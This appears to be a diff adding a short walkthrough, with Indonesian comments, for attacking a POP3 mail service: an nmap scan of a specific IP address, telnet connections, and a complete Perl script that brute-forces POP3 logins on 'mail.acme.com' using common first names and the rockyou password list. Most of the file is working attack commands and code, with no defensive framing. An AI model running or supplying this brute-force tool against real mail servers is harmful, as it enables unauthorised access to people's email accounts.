@@ -1,0 +1,47 @@
+# Scanning the remote host
+$ nmap -p 110 -sC -sV 148.32.42.5
+
+# menghubungkan ke layanan POP3
+$ telnet 148.32.42.5 110 
+
+# Menemukan login POP3 yang valid
+kita dapat menulis skrip perl kecil yang akan memaksa daftar nama depan umum dan Wordlists rockyou untuk sisi kata sandi.
+
+#!/usr/bin/env perl
+use strict;
+use warnings;
+use Net::POP3;
+my $pop3 = Net::POP3->new('mail.acme.com');
+my @userlist = file2array('common-names.txt');
+my @passlist = file2array('rockyou.txt');
+print "[*] Searching for valid POP3 logins...\n";
+foreach my $user (@userlist) {
+    foreach my $pass (@passlist) {        
+        if ($pop3->login($user,$pass)) {
+            print "[+] Found Login: $user:$pass\n";            
+        }
+    }
+    sleep 1;
+}
+$pop3->quit;
+sub file2array {
+    my $file = shift;
+    my @array;
+    open(my $fh, '<', $file) or die $!;
+    while (<$fh>) {
+        chomp($_);
+        push(@array, $_);
+    }
+    close($fh) or die $!;
+    
+    return @array;    
+}
+
+
+# Jalankan script
+$ perl pop3.pl 
+
+# Masuk ke server POP3
+$ telnet 148.32.42.5 110 
+
+
